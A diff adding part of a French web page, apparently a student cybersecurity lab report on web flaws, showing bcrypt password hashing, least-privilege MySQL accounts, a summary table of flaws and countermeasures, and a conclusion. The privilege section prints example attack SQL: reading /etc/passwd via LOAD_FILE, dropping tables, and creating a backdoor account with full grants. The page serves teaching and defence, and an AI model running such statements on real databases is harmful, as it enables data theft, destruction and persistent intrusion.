+              <li>Utiliser <strong>password_hash()</strong> avec <strong>bcrypt</strong> ou <strong>Argon2</strong></li>
+              <li>Vérifier avec <strong>password_verify()</strong> uniquement</li>
+              <li>Ne jamais utiliser MD5, SHA1 ou SHA256 seuls pour des mots de passe</li>
+              <li>Le sel (salt) unique par utilisateur est automatique avec password_hash()</li>
+            </ul>
+          </div>
+          <div class="code-wrap" style="margin-top:12px;">
+            <div class="code-topbar">
+              <div class="code-dots"><div class="code-dot cd-r"></div><div class="code-dot cd-y"></div><div class="code-dot cd-g"></div></div>
+              <span class="code-lang">PHP — hashage bcrypt</span>
+            </div>
+            <pre><code><span class="cc">// ✅ Enregistrement :</span>
+<span class="cg">$hash</span> = <span class="cg">password_hash</span>(<span class="ck">$_POST</span>[<span class="cs">'password'</span>], PASSWORD_BCRYPT);
+<span class="cc">// → $2y$10$8K1p/a0dR1... (hash unique, irréversible)</span>
+
+<span class="cc">// ✅ Connexion :</span>
+<span class="ck">if</span> (<span class="cg">password_verify</span>(<span class="ck">$_POST</span>[<span class="cs">'password'</span>], <span class="ck">$hash_en_bdd</span>)) {
+    <span class="cc">// Connexion autorisée ✓</span>
+} <span class="ck">else</span> {
+    <span class="cc">// Refusé</span>
+}</code></pre>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Faille 4.3 Privilèges -->
+    <div class="flaw-row" id="mysql-privileges">
+      <div class="flaw-left">
+        <div class="flaw-severity sev-haute">
+          <span class="severity-dot"></span>Haute
+        </div>
+        <div class="flaw-num">4.3</div>
+      </div>
+      <div class="flaw-content">
+        <h3 class="flaw-title">🔓 Excès de privilèges des comptes SQL</h3>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="📖 ">Explication</div>
+          <div class="sub-text">
+            Le principe de <strong>moindre privilège</strong> stipule que chaque compte ne doit avoir que
+            les droits nécessaires. Si l'application utilise le compte <code>root</code>, une injection SQL
+            réussie peut entraîner la suppression de tables, la lecture de fichiers système,
+            ou la création de backdoors MySQL.
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="💡 ">Exemple</div>
+          <div class="code-wrap">
+            <div class="code-topbar">
+              <div class="code-dots"><div class="code-dot cd-r"></div><div class="code-dot cd-y"></div><div class="code-dot cd-g"></div></div>
+              <span class="code-lang">SQL — abus de privilèges excessifs</span>
+            </div>
+            <pre><code><span class="cc">-- Si l'app tourne en root, l'attaquant (via injection) peut :</span>
+
+<span class="cc">-- 1. Lire des fichiers système :</span>
+<span class="cd">SELECT LOAD_FILE('/etc/passwd');</span>
+
+<span class="cc">-- 2. Supprimer toutes les données :</span>
+<span class="cd">DROP TABLE users; DROP TABLE commandes;</span>
+
+<span class="cc">-- 3. Créer une backdoor MySQL :</span>
+<span class="cd">CREATE USER 'backdoor'@'%' IDENTIFIED BY 'pass';
+GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';</span></code></pre>
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="🛡️ ">Parade</div>
+          <div class="parade-box">
+            <ul>
+              <li>Créer un compte dédié avec <strong>seulement SELECT, INSERT, UPDATE</strong> sur les tables nécessaires</li>
+              <li>Interdire l'accès externe au port MySQL (3306) via pare-feu</li>
+              <li>Supprimer les comptes MySQL inutilisés et changer les mots de passe par défaut</li>
+              <li>Activer les <strong>logs d'audit MySQL</strong> pour surveiller les requêtes</li>
+            </ul>
+          </div>
+          <div class="code-wrap" style="margin-top:12px;">
+            <div class="code-topbar">
+              <div class="code-dots"><div class="code-dot cd-r"></div><div class="code-dot cd-y"></div><div class="code-dot cd-g"></div></div>
+              <span class="code-lang">SQL — compte restrictif</span>
+            </div>
+            <pre><code><span class="cc">-- ✅ Compte dédié avec droits minimaux :</span>
+<span class="cg">CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'MotDePasseFort!';</span>
+<span class="cg">GRANT SELECT, INSERT, UPDATE ON ma_base.users     TO 'app_user'@'localhost';</span>
+<span class="cg">GRANT SELECT, INSERT          ON ma_base.commandes TO 'app_user'@'localhost';</span>
+<span class="cg">FLUSH PRIVILEGES;</span>
+
+<span class="cc">-- ❌ À ne JAMAIS faire :</span>
+<span class="cd">GRANT ALL PRIVILEGES ON *.* TO 'app'@'%'; -- beaucoup trop permissif !</span></code></pre>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- ════════════════════════════════════════════════
+     TABLEAU RÉCAPITULATIF
+════════════════════════════════════════════════ -->
+<section id="recap" class="summary-section">
+  <div class="wrap">
+    <p class="s-label" data-num="05" aria-hidden="true">Vue d'ensemble</p>
+
+    <h2 style="font-family:var(--font-d);font-size:clamp(2rem,4vw,3rem);font-weight:800;letter-spacing:-.04em;color:var(--white);margin-bottom:0;">
+      Récapitulatif
+    </h2>
+
+    <table aria-label="Tableau récapitulatif des failles de sécurité">
+      <thead>
+        <tr>
+          <th>Techno</th>
+          <th>Faille</th>
+          <th>Sévérité</th>
+          <th>Contre-mesure principale</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><span class="tag-tech tag-html">HTML</span></td>
+          <td class="td-name">Clickjacking</td>
+          <td><span class="sev-pill sp-high"><span class="sp-dot"></span>Haute</span></td>
+          <td class="td-para"><code>X-Frame-Options: DENY</code> + CSP</td>
+        </tr>
+        <tr>
+          <td><span class="tag-tech tag-html">HTML</span></td>
+          <td class="td-name">Formulaires non sécurisés</td>
+          <td><span class="sev-pill sp-med"><span class="sp-dot"></span>Moyenne</span></td>
+          <td class="td-para">HTTPS + <code>type="password"</code> + validation serveur</td>
+        </tr>
+        <tr>
+          <td><span class="tag-tech tag-html">HTML</span></td>
+          <td class="td-name">Données dans le source</td>
+          <td><span class="sev-pill sp-high"><span class="sp-dot"></span>Haute</span></td>
+          <td class="td-para">Variables d'environnement + vérification serveur</td>
+        </tr>
+        <tr>
+          <td><span class="tag-tech tag-js">JS</span></td>
+          <td class="td-name">XSS — Cross-Site Scripting</td>
+          <td><span class="sev-pill sp-crit"><span class="sp-dot"></span>Critique</span></td>
+          <td class="td-para"><code>textContent</code> + encodage + CSP + <code>HttpOnly</code></td>
+        </tr>
+        <tr>
+          <td><span class="tag-tech tag-js">JS</span></td>
+          <td class="td-name">LocalStorage non sécurisé</td>
+          <td><span class="sev-pill sp-high"><span class="sp-dot"></span>Haute</span></td>
+          <td class="td-para">Cookies <code>HttpOnly</code> + vérification côté serveur</td>
+        </tr>
+        <tr>
+          <td><span class="tag-tech tag-js">JS</span></td>
+          <td class="td-name">CSRF</td>
+          <td><span class="sev-pill sp-high"><span class="sp-dot"></span>Haute</span></td>
+          <td class="td-para">Jeton CSRF + <code>SameSite=Strict</code></td>
+        </tr>
+        <tr>
+          <td><span class="tag-tech tag-php">PHP</span></td>
+          <td class="td-name">LFI / RFI</td>
+          <td><span class="sev-pill sp-crit"><span class="sp-dot"></span>Critique</span></td>
+          <td class="td-para">Liste blanche + désactiver <code>allow_url_include</code></td>
+        </tr>
+        <tr>
+          <td><span class="tag-tech tag-php">PHP</span></td>
+          <td class="td-name">Upload de fichiers malveillants</td>
+          <td><span class="sev-pill sp-crit"><span class="sp-dot"></span>Critique</span></td>
+          <td class="td-para">Vérification MIME + renommage + stockage hors racine web</td>
+        </tr>
+        <tr>
+          <td><span class="tag-tech tag-php">PHP</span></td>
+          <td class="td-name">Exposition des erreurs PHP</td>
+          <td><span class="sev-pill sp-med"><span class="sp-dot"></span>Moyenne</span></td>
+          <td class="td-para"><code>display_errors = Off</code> + logs serveur</td>
+        </tr>
+        <tr>
+          <td><span class="tag-tech tag-mysql">MySQL</span></td>
+          <td class="td-name">Injection SQL</td>
+          <td><span class="sev-pill sp-crit"><span class="sp-dot"></span>Critique</span></td>
+          <td class="td-para">Requêtes préparées PDO + moindre privilège</td>
+        </tr>
+        <tr>
+          <td><span class="tag-tech tag-mysql">MySQL</span></td>
+          <td class="td-name">Mots de passe en clair / MD5</td>
+          <td><span class="sev-pill sp-crit"><span class="sp-dot"></span>Critique</span></td>
+          <td class="td-para"><code>password_hash()</code> bcrypt / Argon2</td>
+        </tr>
+        <tr>
+          <td><span class="tag-tech tag-mysql">MySQL</span></td>
+          <td class="td-name">Excès de privilèges SQL</td>
+          <td><span class="sev-pill sp-high"><span class="sp-dot"></span>Haute</span></td>
+          <td class="td-para">Compte dédié + GRANT minimal + pare-feu port 3306</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- ════════════════════════════════════════════════
+     CONCLUSION
+════════════════════════════════════════════════ -->
+<section class="conclusion-section" aria-labelledby="conclusion-title">
+  <div class="wrap">
+    <span class="cta-over" aria-hidden="true">Synthèse · TP Cybersécurité</span>
+
+    <h2 class="cta-title" id="conclusion-title">
+      Ne jamais faire<br>
+      confiance au <span class="accent">client.</span>
+    </h2>
+
+    <p class="cta-text">
+      La sécurité web repose sur un principe fondamental : <strong>valider systématiquement côté serveur</strong>,
+      quelle que soit la validation côté client. Chaque technologie (HTML, JS, PHP, MySQL) présente
+      ses propres vulnérabilités mais elles partagent la même origine — un manque de filtrage ou de cloisonnement.
+    </p>
+    <p class="cta-text">
+      La défense efficace repose sur une approche en <strong>couches (défense en profondeur)</strong>.
+      Une seule faille non corrigée peut suffire à compromettre un système entier.
+    </p>
+  </div>
+</section>
+
+<!-- ════ FOOTER ════ -->
+<footer class="doc-footer">
+  <div class="wrap footer-inner">
+    <span class="footer-logo">TP Cybersécurité</span>
+    <div class="footer-meta">
+      Bac Pro CIEL · 2025–2026<br>
+      Nom Prénom · Classe
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
